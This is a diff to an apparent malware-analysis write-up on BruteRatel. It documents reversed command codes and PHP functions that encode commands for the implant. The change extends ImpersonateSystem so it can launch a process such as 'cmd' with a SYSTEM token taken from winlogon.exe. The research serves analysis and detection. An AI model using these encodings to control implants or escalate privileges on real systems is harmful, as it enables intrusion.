@@ -7,6 +7,8 @@ date: 2025-03-20
 
 ## BRUTERATEL COMMAND LIST PART 3
 
+updated 25/04/2025  
+
 ## Context  
 
 BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  
@@ -44,7 +46,7 @@ Here is a short description of the next 20 command codes and purpose :
 | "\xc0\xeb"   | [TerminateProcess](#TerminateProcess) | $pid            |
 | "\xd0\xbe"   | [ShellExecuteExA](#ShellExecuteExA) | $verb, $file, $parameters            |
 | "\xe0\x9d"   | [ListActiveProcess](#ListActiveProcess) | NA                |
-| "\xae\x6b"   | [ImpersonateSystem](#ImpersonateSystem) | NA |
+| "\xae\x6b"   | [ImpersonateSystem](#ImpersonateSystem) | $command_line |
 | "\x39\x6f"   | [ImpersonateSystem2](#ImpersonateSystem2) | NA  |
 | "\xd9\xf3"   | [unknown](#unknown) | $p1, $p2 |
 | "\xd4\x3f"   | [unknown2](#unknown2) | $p1, $p2          |
@@ -518,9 +520,21 @@ function ListActiveProcess()
 # ImpersonateSystem  
 
 ```php
-function ImpersonateSystem()
+/*
+	$command_line is an OPTIONAL parameter
+	if specified, the command will attempt a CreateProcessWithTokenW with the SYSTEM token from winlogon.exe
+	if not, the command will impersonate the SYSTEM user for the current process
+*/
+// ex: ImpersonateSystem("cmd");
+// ex: ImpersonateSystem();
+function ImpersonateSystem($command_line = null)
 {
-	$cmd_id = "\xae\x6b";
+	if ($command_line === null){
+		$cmd_id = "\xae\x6b";
+	}
+	else {
+		$cmd_id = "\xae\x6b $command_line";
+	}
 	
 	$cmd_id_b64 = base64_encode($cmd_id);
 	
